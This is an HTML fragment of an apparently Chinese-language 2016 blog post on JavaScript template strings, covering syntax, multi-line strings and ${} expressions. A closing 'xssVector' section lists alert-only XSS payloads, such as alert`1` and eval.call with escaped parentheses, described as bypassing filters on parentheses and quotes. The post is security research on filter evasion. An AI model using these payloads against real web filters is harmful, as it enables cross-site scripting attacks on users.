-<h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`strings`</span> <span class="comment">//  单行 和' " 用法一样</span></span><br><span class="line"><span class="string">`string1</span><br><span class="line"> string2`</span> <span class="comment">//  多行</span></span><br><span class="line"><span class="string">`string <span class="subst">$&#123;expression&#125;</span> string`</span> <span class="comment">// 可以直接引用变量, 像angualr一样</span></span><br></pre></td></tr></table></figure>
-<h3 id="注意注释"><a href="#注意注释" class="headerlink" title="注意注释"></a>注意注释</h3><blockquote>
-<pre><code>console.log(` test1        // there is no comments can stand!
-     test2`);
-</code></pre></blockquote>
-<p>这句话看似有个单行注释, 实际上`会忽略注释的存在, 所以<code>注释无效</code></p>
-<h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;a&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//  输出1</span></span><br></pre></td></tr></table></figure>
-<h3 id="特殊的-num"><a href="#特殊的-num" class="headerlink" title="特殊的//num"></a>特殊的//num</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;1234&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//  可以直接输出1234</span></span><br></pre></td></tr></table></figure>
-<p>这个原因应该是 <code>数字开头</code>的不能作为js变量</p>
-<h2 id="xssVector"><a href="#xssVector" class="headerlink" title="xssVector"></a>xssVector</h2><h3 id="1st"><a href="#1st" class="headerlink" title="1st"></a>1st</h3><p>最简单的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert<span class="string">`1`</span></span><br><span class="line"><span class="comment">//  直接绕过() "" ''</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2nd"><a href="#2nd" class="headerlink" title="2nd"></a>2nd</h3><p>第二个…<del>感觉是失败了</del><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert.call(<span class="keyword">this</span>, <span class="string">`<span class="subst">$&#123;1&#125;</span>`</span>)</span><br></pre></td></tr></table></figure></p>
-<h3 id="3rd"><a href="#3rd" class="headerlink" title="3rd"></a><strong>3rd</strong></h3><p>这个很棒, 绕过了() “” ‘’, 能使eval拥有<code>()</code>可以执行并且支持多种编码, 吊吊吊<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>.call<span class="string">`<span class="subst">$&#123;`alert\x281)`&#125;</span>`</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="最后一个"><a href="#最后一个" class="headerlink" title="最后一个"></a>最后一个</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;`alert(1)`&#125;</span>`</span> === <span class="string">'alert(1)'</span> ? alert(<span class="literal">true</span>) : alert(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="external">MDN</a></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/08/05/2016/js-template-strings/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/05/2016/js-template-strings/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
